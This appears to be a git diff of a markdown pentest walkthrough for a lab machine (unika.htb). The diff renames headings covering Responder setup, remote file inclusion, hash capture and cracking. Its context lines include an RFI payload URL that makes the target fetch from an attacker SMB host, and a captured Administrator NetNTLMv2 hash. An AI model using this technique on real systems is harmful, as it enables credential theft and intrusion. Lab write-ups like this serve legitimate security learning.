@@ -11,9 +11,9 @@
   - [Attack Overview]()
   - [Attack Set-Up]()
     - [Start responder]()
-    - [Capture the Hash: RFI]()
-    - [Responder Capture the Hash]()
-    - [Crack the Hash]()
+    - [Force the Hash: RFI]()
+    - [Capture the Hash: Responder]()
+    - [Crack the Hash: John]()
     - [Exploit with Evil-WinRM]()
 
 ## Installation & Syntax
@@ -71,7 +71,7 @@ HTTP = On        #  chane "On" to "Off"
 responder -I [network_interface]
 ```
 
-#### Capture the Hash: RFI
+#### Force the Hash: RFI
 - [RFI: Remote File Inclusion](/05_Vulnerability_Assessment/file_inclusion_remote.md)
 - With the Responder server ready, we tell the server to include a resource from our SMB server by setting the page parameter as follows via the web browser.- 
 ```
@@ -82,7 +82,7 @@ http://unika.htb/?page=//[attack machine ip]/somefile
 - Note: Make sure to add `http://` in the address as some browsers might opt for a Google search instead of navigating to the appropriate page.
 - After sending our payload through the web browser we get an error about not being able to load the requested file (because it doesn't exist and we don't care).
 
-#### Responder Capture the Hash
+#### Capture the Hash: Responder
 - On checking our listening Responder server we can see we have a NetNTLMv for the Administrator user.
 - The NetNTLMv2 includes both the challenge (random text) and the encrypted response.
 ```
@@ -91,7 +91,7 @@ http://unika.htb/?page=//[attack machine ip]/somefile
 [SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:9f588ec010af5d68:4BFAFABBB79B9B1A0104A82BB0D3DB2D:0101000000000000809ED6830C67DA011611E316DB09ED7900000000020008004C004B003100580001001E00570049004E002D004F00300034004D004F004F00530046004D003200340004003400570049004E002D004F00300034004D004F004F00530046004D00320034002E004C004B00310058002E004C004F00430041004C00030014004C004B00310058002E004C004F00430041004C00050014004C004B00310058002E004C004F00430041004C0007000800809ED6830C67DA010600040002000000080030003000000000000000010000000020000002F44D4DF31257C5FAA63A38652FD4A82B473A2B0D4893AE6C495EEF60A2B9DB0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00320035000000000000000000
 ```
 
-#### Crack the Hash
+#### Crack the Hash: John
 - Copy the Admin hash to a text file: 
 ```
 vim hash.txt  # copy and paste the hash and only the hash
